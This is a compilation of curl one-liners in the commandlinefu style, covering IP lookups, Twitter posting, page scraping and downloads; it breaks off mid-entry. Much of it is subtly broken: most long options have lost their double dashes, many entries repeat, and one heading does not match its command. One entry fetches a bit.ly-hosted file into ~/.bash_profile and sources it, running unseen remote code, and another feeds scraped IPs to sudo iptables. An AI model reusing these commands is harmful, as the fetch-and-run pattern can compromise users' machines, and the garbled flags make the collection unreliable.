```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Send an http HEAD request w/curl
```sh
curl -I http://localhost
```

### Get My Public IP Address
```sh
curl ifconfig.me
```

### show WAN IP
```sh
curl ifconfig.me
```

### JSON processing with Python
```sh
curl -s "http://feeds.delicious.com/v2/json?count=5" | python -m json.tool | less -R
```

### Update twitter via curl
```sh
curl -u user -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Upload an image to Twitpic
```sh
curl -F "username=mytwiterlogin" -F "password=mytwitterpassword" -F "message=My image description" -F media=@"./image.png" http://twitpic.com/api/uploadAndPost
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" | play -t mp3 -
```

### Download a TiVo Show
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest "$(curl -s -c /tmp/cookie -k -u tivo:$MAK digest https://$tivo/nowplaying/index.html | sed 's;.*<a href="\([^"]*\)">Download MPEG-PS</a>.*;\1;' | sed 's|\&amp;|\&|')" | tivodecode -m $MAK  - > tivo.mpg
```

### Play 2600 off the hook over ssh
```sh
curl -L -s `curl -s http://www.2600.com/oth-broadband.xml` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### Play a podcast via XPath and mpg123
```sh
curl -L -s `curl -s [http://podcast.com/show.rss]` | xmlstarlet sel -t -m "//enclosure[1]" -v "@url" -n | head -n 1` | ssh -t [user]@[host] "mpg123 -"
```

### get WAN / external IP
```sh
curl tnx.nl/ip
```

### Get magnet link from URL
```sh
curl -s http://host.net/url.html | grep magnet | sed -r 's/.*(magnet:[^"]*).*/\1/g'
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Check your unread Gmail from the command line
```sh
curl -u username:password silent "https://mail.google.com/mail/feed/atom" | tr -d '\n' | awk -F '<entry>' '{for (i=2; i<=NF; i++) {print $i}}' | sed -n "s/<title>\(.*\)<\/title.*name>\(.*\)<\/name>.*/\2 - \1/p"
```

### Command Line to Get the Stock Quote via Yahoo
```sh
curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
```

### upload a file via ftp
```sh
curl -u user:passwd -T /home/dir/local_file_to_upload ftp://your_host.com/subdir/
```

### Spelling Suggestion
```sh
curl -s "http://search.yahooapis.com/WebSearchService/V1/spellingSuggestion?appid=YahooDemo&query=mozmbque"|sed -n -e 's/.*<Result>\(.*\)<\/Result>.*/\1/p'
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Download all files from a Gist without Git
```sh
curl -L https://gist.github.com/westonruter/ea038141e46e017d280b/download | tar -xvz strip-components=1
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl http://www.discogs.com/search?q=724349691704 2> /dev/null | grep \/release\/ | head -2 | tail -1 | sed -e 's/^<div>.*>\(.*\)<\/a><\/div>/\1/'
```

### Get your public ip
```sh
curl -s http://icanhazip.com/
```

### Get the amount of users currently registered at the DudaLibre.com Linux Counter.
```sh
curl silent http://www.dudalibre.com/gnulinuxcounter?lang=en | grep users | head -2 | tail -1 | sed 's/.*<strong>//g' | sed 's/<\/strong>.*//g'
```

### Send a message to Kodi (XBMC)
```sh
curl -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"GUI.ShowNotification","params":{"title":"This is the title of the message","message":"This is the body of the message"},"id":1}' http://i3c.pla.lcl:8080/jsonrpc
```

### Make a HTTP request using curl with POST method
```sh
curl verbose -d "hello=world" http://mydomain.com
```

### get the current weather in NYC, in human readable form
```sh
curl -s poncho.is/forecast/new_york/today/ | grep -E 'og:title|og:description' | cut -d\" -f4 | awk '{print $0,"<p>"}' | lynx -stdin -dump
```

### copy remote ssh session output to local clipboard
```sh
curl "https://coinurl.com/api.php?uuid=5378..........5&url=http://www.commandlinefu.com"
```

### Get number of diggs for a news URL
```sh
curl -s "http://services.digg.com/stories?link=$NEWSURL&appkey=http://www.whatever.com&type=json"  | python -m simplejson.tool | grep diggs
```

### Backup your precious Tomato Router Stats
```sh
curl http://root:PASSWORD@ROUTER_DYN_DNS/bwm/tomato_rstatsa001839ceb1d4.gz?_http_id=HTTPID > $HOME/Dropbox/Backups/tomato_stats.gz
```

### Get URL's from a webpage
```sh
curl url | egrep -o '(http|https)://[a-z0-9]*\.[a-z0-9]*\.[a-z0-9]*'|sort |uniq
```

### Get HTTP headers using curl, but still perform a GET
```sh
curl -sSi <URL> | sed '/^\r$/q'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### moreplayingaround
```sh
curl -s -u username:passwd http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |festival tts
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/wg/|sed -r 's/.*href="([^"]*).*/\1\n/g'|grep images|xargs wget
```

### Dump filtered twitter stream to a file
```sh
curl -s -u $USERNAME -X POST -d "track=obama,barack" https://stream.twitter.com/1.1/statuses/filter.json -o twitter-stream.out
```

### Get your external IP address
```sh
curl l2.io/ip
```

### Shorten url using bit.ly API
```sh
curl -s data-urlencode 'longUrl='$1 data-urlencode 'login='$login data-urlencode 'apiKey='$apikey 'http://api.bit.ly/shorten?version=2.0.1&format=xml' | xmlstarlet sel -T -t -m "//shortUrl" -v "." | line
```

### Basic monitor for a website or API looking at HTTP response codes
```sh
curl write-out %{http_code} connect-timeout 10 max-time 20 -s -I -L http://google.com output /dev/null
```

### Print the lastest stable version of Perl
```sh
curl -s http://www.perl.org/get.html | grep -m1 '\.tar\.gz' | sed 's/.*perl-//; s/\.tar\.gz.*//'
```

### View the newest xkcd comic.
```sh
curl -s 'xkcd.com' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### geoip information
```sh
curl -s "http://www.geody.com/geoip.php?ip=$(curl -s icanhazip.com)" | sed '/^IP:/!d;s/<[^>][^>]*>//g'
```

### What is my ip?
```sh
curl http://www.whatismyip.org/
```

### back up your commandlinefu contributed commands
```sh
curl http://www.commandlinefu.com/commands/by/<your username>/rss|gzip ->commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
```

### What is my ip?
```sh
curl -s mi-ip.net | grep '"ip"' | cut -f2 -d ">" | egrep -o '[0-9.]+'
```

### Retrieve the final URL after redirect
```sh
curl $URL -s -L -o /dev/null -w '%{url_effective}'
```

### get daily wizard of id comic
```sh
curl -o id.gif `date +http://d.yimg.com/a/p/uc/%Y%m%d/largeimagecrwiz%y%m%d.gif`
```

### Get current stable kernel version string from kernel.org
```sh
curl -s kernel.org | grep '<strong>' | head -3 | tail -1 | cut -d'>' -f3 | cut -d'<' -f1
```

### extract XML RSS etc by tags such as <title> or <code> or <description>
```sh
curl ${URL} 2>/dev/null|grep "<${BLOCK}>"|sed -e "s/.*\<${BLOCK}\>\(.*\)\<\/${BLOCK}\>.*/\1/g"
```

### Get the state (HTTP code) of a resource from its URL
```sh
curl -s -L head -w "%{http_code}\n" URL | tail -n1
```

### display the hover text of the most recent xkcd
```sh
curl -s 'http://xkcd.com/rss.xml' | xpath '//item[1]/description/text()' 2>&1 | sed -n 's/.*title="\([^"]*\)".*/\1/p' | fold -s
```

### Output the latest linux kernel versions from kernel.org
```sh
curl 'https://www.kernel.org/kdist/finger_banner'
```

### Check if the LHC has destroyed the world
```sh
curl -q -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### Display current temperature anywhere in the world in Farenheit
```sh
curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_f data..//;s/....temp_c data.*//;p" | figlet
```

### Send an http HEAD request w/curl
```sh
curl -i -X HEAD http://localhost/
```

### Clone all github repos of a user
```sh
curl -s "https://api.github.com/users/${USERNAME}/repos" | ruby -rubygems -e 'require "json"; JSON.load(STDIN.read).each {|repo| %x[git clone #{repo["ssh_url"]} ]}'
```

### backup and synchronize entire remote folder locally (curlftpfs and rsync over FTP using FUSE FS)
```sh
curlftpfs ftp://YourUsername:YourPassword@YourFTPServerURL /tmp/remote-website/ && rsync -av /tmp/remote-website/* /usr/local/data_latest && umount /tmp/remote-website
```

### Search commandlinefu from the CLI
```sh
curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |html2text -width 100
```

### Find your Amazon EC2 instance type
```sh
curl -s http://169.254.169.254/latest/meta-data/instance-type
```

### What is my public IP address
```sh
curl -s checkip.dyndns.org|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
```

### Send youtube video to Kodi
```sh
curl -i -X POST -d '{"jsonrpc": "2.0", "method": "Player.Open", "params": {"item": { "file" : "plugin://plugin.video.youtube/play/?video_id=YOUTUBEID"}}, "id": 1}' http://username:password@kodi/jsonrpc -H "Content-Type: application/json"
```

### Shorten url with is.gd using curl, perl
```sh
curl -s "http://is.gd/api.php?longurl=[long_url]"
```

### Get own public IP address
```sh
curl -s http://wtfismyip.com/text
```

### Get IP address from Tor exit-node
```sh
curl -s -d "CSField=Name" -d "CSInput=BostonUCompSci" http://torstatus.blutmagie.de/index.php | grep -oP "ip=\K(\d+)(\.\d+){3}"
```

### Download all files from a Github gist individually
```sh
curl -sS remote-name-all $(curl -sS https://api.github.com/gists/997ccc3690ccd3ac5196211aff59d989 | jq -r '.files[].raw_url')
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl -s 'http://checkip.dyndns.org' | sed 's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### commit message generator - whatthecommit.com
```sh
curl -s 'http://whatthecommit.com/' | grep '<p>' | cut -c4-
```

### check details of calling a url
```sh
curl -iv url
```

### sha256 checksum for Chef's remote_file resource
```sh
curl -L -s https://some.file | shasum -a 256 | cut -c-12
```

### Download all images from a 4chan thread
```sh
curl -s http://boards.4chan.org/-/res/nnnnnn | grep -o -i 'File: <a href="//images.4chan.org\/[a-z]*\/src\/[0-9]*\.[a-z]\{3\}' | sed -r 's/File: <a href="\/\///' |xargs wget
```

### Download 40 top funnyjunk Images to the current directory
```sh
curl -s compressed http://funnyjunk.com | awk -F'"' '/ '"'"'mainpagetop24h'"'"'/ { print "http://funnyjunk.com"$4 }' | xargs curl -s | grep -o 'ht.*m/pictures/.*\.jpg\|ht.*m/gifs/.*\.gif' | grep "_......_" | uniq | xargs wget
```

### command line fu roulette
```sh
curl -sL 'www.commandlinefu.com/commands/random' | awk -F'</?[^>]+>' '/"command"/{print $2}'
```

### Fastest way to get public IP
```sh
curl simplesniff.com/ip
```

### Get newest Nmap source code tarball URL.
```sh
curl -Ls https://nmap.org/dist/ | sed -En '/nmap.*tgz/s@^.*href="([^"]+)".*$@https://nmap.org/dist/\1@p' | tail -n1
```

### Get external IP address
```sh
curl -qsL http://checkip.dyn.com | sed -E "s/^.*Address: ([0-9\.]+).*$/\1/"
```

### Submit data to a HTML form with POST method and save the response
```sh
curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
```

### Save the Top 2500 commands from commandlinefu to a single text file
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt
```

### BOFH Excuse using curl
```sh
curl -s http://pages.cs.wisc.edu/~ballard/bofh/bofhserver.pl |grep 'is:' |awk 'BEGIN { FS=">"; } { print $10; }'
```

### Delete posts from MyBB Board as User
```sh
curl cookie name=<cookie_value> data-urlencode name=my_post_key=<post_key>\&delete=1\&submit=Delete+Now\&action=deletepost\&pid=$c user-agent Firefox\ 3.5 url http://url/editpost.php?my_post_key=<post_key>\&delete=1\&submit=Delete+Now\&action=dele
```

### This command will shorten any URL the user inputs. What makes this command different is that it utilizes 5 different services and gives you 5 different outputs.
```sh
curl -s http://tinyurl.com/create.php?url=$1 \ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' \ | uniq ; curl -s http://bit.ly/?url=$1 \ | sed -n 's/.*\(shortened-url"...............
```

### Get Chromecast opencast pincode
```sh
curl -s "http://$chromecast_ip_address:8008/setup/eureka_info?options=detail" | jq .opencast_pin_code raw-output
```

### Openstack, trigger ceilometer alarm webhook
```sh
curl -X POST -i `ceilometer alarm-show 1383a6be-fb73-4955-9991-8d65a8a23d60  | tr '\n' ' ' | sed -e 's/.*\[\(.*\)\].*/\1/' -e 's/[| ]*//g' -e 's/^u//' -e "s:'::g"`
```

### External IP (raw data)
```sh
curl icanhazip.com
```

### save login cookie
```sh
curl -c cookie.txt -d username=hello -d password=w0r1d http://www.site.com/login
```

### Get your public ip using dyndns
```sh
curl -s 'http://www.loopware.com/ip.php'
```

### send cookie
```sh
curl -b cookie.txt http://www.site.com/download/file.txt
```

### firefox ascii logo
```sh
curl -s http://people.mozilla.com/~faaborg/files/shiretoko/firefoxIcon/firefox-64.png | convert - jpg:- | jp2a color html -> firefox.html
```

### batch download jpgs which are in sequence
```sh
curl -O http://www.site.com/img/image[001-175].jpg
```

### Get a list of HTTP status codes
```sh
curl http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html 2>/dev/null | grep '^<h3' | grep -v '^\d' | perl -pe 's/^.*(?<=(\d\d\d)) (.*)<\/h3>$/$1 : $2/' | grep -v h3
```

### Add git branch name to bash prompt
```sh
curl -L bit.ly/git_bash_profile > ~/.bash_profile && source ~/.bash_profile
```

### External IP (raw data)
```sh
curl ifconfig.me
```

### Get only headers from a website with curl even if it doesn't support HEAD
```sh
curlh() { x="$(curl -Is -w '%{http_code}' "$@")"; if [[ "$(tail -n 1 <<< "$x")" == [45]* ]]; then curl -is "$@" | awk '{ if (!NF) { exit }; print }'; else head -n -1 <<< "$x"; fi; }
```

### Get your outside IP address - now with IPv6 support
```sh
curl ip.tyk.nu
```

### Print trending topics on Twitter
```sh
curl -s mobile.twitter.com/search | sed -n '/trend_footer_list/,/\ul>/p' | awk -F\> '{print $3}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### webpage reader
```sh
curl -s http://www.google.com | espeak -m -ven+11
```

### Amazing real time picture of the sun in your wallpaper
```sh
curl http://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -onroot -fill stdin
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.json
```

### Watch a TiVo File On Your Computer
```sh
curl -s -c /tmp/cookie -k -u tivo:$MAK digest http://$tivo/download/$filename | tivodecode -m $MAK  - | mplayer - -cache-min 50 -cache 65536
```

### Get current stable kernel version string from kernel.org
```sh
curl -s -k https://www.kernel.org/feeds/kdist.xml | sed -n -e 's@.*<guid>\(.*\)</guid>.*@\1@p' | grep 'stable' | head -1 | awk -F , '{print $3}'
```

### Fetch the current human population of Earth
```sh
curl silent http://www.census.gov/population/international/ | grep wclocknum | sed -r 's@^.*>([0-9,]+)<.*$@\1@'
```

### Get the rough (german) time from Twitter by @zurvollenstunde
```sh
curl -s "http://search.twitter.com/search?from=zurvollenstunde&rpp=1"  | grep -E '(Es ist jetzt|ago)'  | sed 's/<[^>]*>//g;s/[^[:digit:]]//g'  | xargs | sed -e 's#\ #:#'
```

### Command to get list of all existing programming languages from Wikipedia article
```sh
curl http://en.wikipedia.org/wiki/List_of_programming_languages | grep "<li>" | awk -F"title=" '{ print $2 }' | awk -F\" '{ print $2 }'
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Nice weather forecast on your shell
```sh
curl wttr.in/seville
```

### Extract tarball from internet without local saving
```sh
curl http://example.com/a.gz | tar xz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get your outgoing IP address
```sh
curl -s ip.appspot.com
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter from command line without reveal your password
```sh
curl -n -d status='Hello from cli' https://twitter.com/statuses/update.xml
```

### Search commandlinefu.com from the command line using the API
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### What is my public IP-address?
```sh
curl ifconfig.me
```

### Print trending topics on Twitter
```sh
curl -s search.twitter.com | awk -F'</?[^>]+>' '/\/intra\/trend\//{print $2}'
```

### generate random identicon
```sh
curl -s "http://www.gravatar.com/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG" | display
```

### What is my ip?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### Random line from bash.org  (funny IRC quotes)
```sh
curl -s http://bash.org/?random1|grep -oE "<p class=\"quote\">.*</p>.*</p>"|grep -oE "<p class=\"qt.*?</p>"|sed -e 's/<\/p>/\n/g' -e 's/<p class=\"qt\">//g' -e 's/<p class=\"qt\">//g'|perl -ne 'use HTML::Entities;print decode_entities($_),"\n"'|head -1
```

### What is my ip?
```sh
curl ifconfig.co
```

### What is my ip?
```sh
curl ifconfig.co/all.json
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Extract a remote tarball in the current directory without having to save it locally
```sh
curl http://example.com/foo.tar.gz | tar zxvf -
```

### get you public ip address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### resume download using curl
```sh
curl -C - -o partially_downloaded_file 'www.example.com/path/to/the/file'
```

### Download all Phrack .tar.gzs
```sh
curl http://www.phrack.org/archives/tgz/phrack[1-67].tar.gz -o phrack#1.tar.gz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Check if your webserver supports gzip compression with curl
```sh
curl -I -H "Accept-Encoding: gzip,deflate" http://example.org
```

### Twit Amarok "now playing" song
```sh
curl -u <user>:<password> -d status="Amarok, now playing: $(dcop amarok default nowPlaying)" http://twitter.com/statuses/update.json
```

### Search Google from the command line
```sh
curl -A Mozilla http://www.google.com/search?q=test |html2text -width 80
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Save xkcd to a pdf with captions
```sh
curl -sL xkcd.com | grep '<img [^>]*/><br/>' | sed -r 's|<img src="(.*)" title="(.*)" alt="(.*)" /><br/>|\1\t\2\t\3|' > /tmp/a; curl -s $(cat /tmp/a | cut -f1) | convert - -gravity south -draw "text 0,0 \"$(cat /tmp/a | cut -f2)\"" pdf:- > xkcd.pdf
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get HTTP status code with curl
```sh
curl write-out %{http_code} silent output /dev/null localhost
```

### Google URL shortener
```sh
curl -s -d'&url=URL' http://goo.gl/api/url | sed -e 's/{"short_url":"//' -e 's/","added_to_history":false}/\n/'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update dyndns.org with your external IP.
```sh
curl -v -k -u user:password "https://members.dyndns.org/nic/update?hostname=<your_domain_name_here>&myip=$(curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g')&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG"
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Gets a random Futurama quote from /.
```sh
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
```

### let the cow suggest some commit messages for you
```sh
curl -s http://whatthecommit.com/index.txt | cowsay
```

### Real time satellite wheather wallpaper
```sh
curl http://www.cpa.unicamp.br/imagens/satelite/ult.gif | xli -onroot -fill stdin
```

### Get your public ip
```sh
curl -s ip.appspot.com
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -n '5p' | sed 's/^X-//'
```

### A command to post a message to Twitter that includes your geo-location and a short URL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s tinyurl.com/api-create.php?url=URL_GOES_HERE) $(curl -s api.hostip.info/get_html.php?ip=$(curl ip.appspot.com))" -d source="cURL" twitter.com/statuses/update.json -o /dev/null
```

### Retrieve top ip threats from http://isc.sans.org/sources.html and add them into iptables output chain.
```sh
curl -s http://isc.sans.org/sources.html|grep "ipinfo.html"|awk -F"ip=" {'print $2'}|awk -F"\"" {'print $1'}|xargs -n1 sudo iptables -A OUTPUT -j DROP -d > 2&>1
```

### Print trending topics on Twitter
```sh
curl silent search.twitter.com | sed -n '/div id=\"hot\"/,/div/p' | awk -F\> '{print $2}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### Get your external IP address
```sh
curl ip.appspot.com
```

### set desktop background to highest-rated image from Reddit /r/wallpapers
```sh
curl http://www.reddit.com/r/wallpapers.rss | grep -Eo 'http:[^&]+jpg' | head -1 | xargs feh bg-seamless
```

### Geolocate a given IP address
```sh
curl ipinfo.io/<ipaddress>
```

### bulk dl files based on a pattern
```sh
curl -O http://hosted.met-art.com/generated_gallery/full/061606AnnaUkrainePasha/met-art-free-sample-00[00-19].jpg
```

### Download and extract a *tar.gz file with curl.
```sh
curl http://domain.com/file.tar.gz | tar zx
```

### Updating the status on identi.ca using curl.
```sh
curl -u USER:PASS -d status="NEW STATUS" http://identi.ca/api/statuses/update.xml
```

### Updates your no-ip.org account with curl
```sh
curl -u $USERNAME:$PASSWORD "http://dynupdate.no-ip.com/nic/update?hostname=$HOSTNAME"
```

### Get your outgoing IP address
```sh
curl -s icanhazip.com
```

### Get Dollar-Euro exchage rate
```sh
curl -s wap.kitco.com/exrate.wml | awk ' BEGIN { x=0; FS = "<" } { if ($0~"^<br/>") {x=0} if (x==1) {print $1} if ($0~"EUR/US") {x=1} }'
```

### Get your Tweets from the command line
```sh
curl -s -u user:password 'http://twitter.com/statuses/friends_timeline.xml?count=5' | xmlstarlet sel -t -m '//status' -v 'user/screen_name' -o ': ' -v 'text' -n
```

### View online pdf documents in cli
```sh
curl 'LINK' | pdftotext - - | less
```

### get you public ip address
```sh
curl http://ifconfig.me/ip
```

### What is My WAN IP?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### validate json
```sh
curl -s -X POST http://www.jsonlint.com/ajax/validate -d json="`cat file.js`" -d reformat=no
```

### Twitpic upload and Tweet
```sh
curl form username=from_twitter form password=from_twitter form media=@/path/to/image form-string "message=tweet" http://twitpic.com/api/uploadAndPost
```

### commit message generator - whatthecommit.com
```sh
curl http://whatthecommit.com/index.txt
```

### Display HTTP-header using curl
```sh
curl -I g.cn
```

### Check your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'
```

### Google URL shortener
```sh
curl -s 'http://ggl-shortener.appspot.com/?url='"$1" | sed -e 's/{"short_url":"//' -e 's/"}/\n/g'
```

### Get your outgoing IP address
```sh
curl -s http://whatismyip.org/ | grep -oP '(\d{1,3}\.){3}\d+'
```

### Download files linked in a RSS feed
```sh
curl $1 | grep -E "http.*\.mp3" | sed "s/.*\(http.*\.mp3\).*/\1/" | xargs wget
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### return external ip
```sh
curl ipinfo.io
```

### display ip address
```sh
curl -s http://myip.dk | grep '<title>' | sed -e 's/<[^>]*>//g'
```

### Dump a web page
```sh
curl -s http://google.com | hexdump -C|less
```

### Backup your OpenWRT config (only the config, not the whole system)
```sh
curl -d 'username=root&password=your-good-password' "http://router/cgi-bin/luci/admin/system/backup?backup=kthxbye" > `date +%Y%d%m`_config_backup.tgz
```

### Your GeoIP location on Google Maps
```sh
curl -s http://geoiplookup.wikimedia.org/|awk -F, '{print $3,$4}'|awk -F'"' '{print "http://maps.google.com/maps?q="$4 "," $8}'
```

### What is my public IP address
```sh
curl ifconfig.me
```

### Get your commandlinefu points (upvotes - downvotes)
```sh
curl -s http://www.commandlinefu.com/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\"command\"/{gsub(/&quot;/,"\"",$2); gsub(/&lt;/,"<",$2); gsub(/&gt;/,">",$2); gsub(/&amp;/,"\\&",$2); cmd=$2} /class=\"num-votes\"/{printf("%3i  %s\n", $2, cmd)}'
```

### Get your outgoing IP address
```sh
curl icanhazip.com
```

### Update Ping.fm status
```sh
curl -d api_key="$api_key" -d user_app_key="$user_app_key -d body="$body" -d post_method="default" http://api.ping.fm/v1/user.post
```

### Test load balancers
```sh
curl resolve subdomain.example.com:80:10.100.0.1 subdomain.example.com -I -s
```

### Check a server is up. If it isn't mail me.
```sh
curl -fs brandx.jp.sme 2&>1 > /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
```

### send tweets to twitter (and get user details)
```sh
curl basic user "user:pass" data-ascii "status=tweeting%20from%20%the%20linux%20command%20line" http://twitter.com/statuses/update.json
```

### return external ip
```sh
curl ipinfo.io
```

### Quick and dirty RSS
```sh
curl silent "FEED ADDRESS" |sed -e 's/<\/[^>]*>/\n/g' -e 's/<[^>]*>//g
```

### Find the annual salary of any White House staffer.
```sh
curl -s "http://www.socrata.com/api/views/vedg-c5sb/rows.json?search=Axelrod" | grep "data\" :" | awk '{ print $17 }'
```

### Get the header of a website
```sh
curl -sI http://blog.binfalse.de
```

### Random quote from Borat  no html parsing
```sh
curl -s "http://smacie.com/randomizer/borat.txt" | shuf -n 1 -
```

### Get info about a GitHub user
```sh
curl http://github.com/api/v1/yaml/git
```

### Get info about a GitHub project
```sh
curl http://github.com/api/v1/yaml/search/vim
```

### Get http headers for an url
```sh
curl -I www.commandlinefu.com
```

### online MAC address lookup
```sh
curl -s http://www.macvendorlookup.com/getoui.php?mac=$1 | sed -e 's/<[^>]\+>//g'; echo
```

### online MAC address lookup
```sh
curl -s http://standards.ieee.org/regauth/oui/oui.txt | grep $1
```

### Say something out loud
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=$(echo "$@" | sed 's/ /+/g')" | play -t mp3 -
```

### Download a numbered sequence of files
```sh
curl silent -O "http://www.somewebsite.com/imagedir/image_[00-99].jpg"
```

### HTTP Get of a web page via proxy server with login credentials
```sh
curl -U username[:password] -x proxyserverIP:proxyserverPort webpageURI
```

### grab all commandlinefu shell functions into a single file, suitable for sourcing.
```sh
curl -s http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25] | grep -oP "^\w+\(\)\ *{.*}"
```

### import gpg key from the web
```sh
curl -s http://defekt.nl/~jelle/pubkey.asc | gpg import
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Which Twitter user are you?
```sh
curl -s http://twitter.com/username | grep 'id="user_' | grep -o '[0-9]*'
```

### Retrieve the size of a file on a server
```sh
curl -s "$URL" |wc -c
```

### get delicious bookmarks on your shell (text version :-))
```sh
curl -u 'username'   https://api.del.icio.us/v1/posts/all   |  sed 's/^.*href=//g;s/>.*$//g;s/"//g' | awk '{print $1}' | grep 'http'
```

### post data with a http request
```sh
curl -d "a1=v1&a2=v2" url
```

### Get an authorization code from Google
```sh
curl -s https://www.google.com/accounts/ClientLogin -d Email=$email -d Passwd=$password -d service=lh2 | grep Auth | sed 's/Auth=\(.*\)/\1/'
```

### Save all commands from commandlinefu.com to plain text sort by vote
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-9000:25] | grep -vE "_curl_|\.com by David" > clf-ALL.txt
```

### Shorten any Url using bit.ly API, using your API Key which enables you to Track Clicks
```sh
curl "http://api.bit.ly/shorten?version=2.0.1&longUrl=<LONG_URL_YOU_WANT_SHORTENED>&login=<YOUR_BITLY_USER_NAME>&apiKey=<YOUR_API_KEY>"
```

### translate what is in the clipboard in english and write it to the terminal
```sh
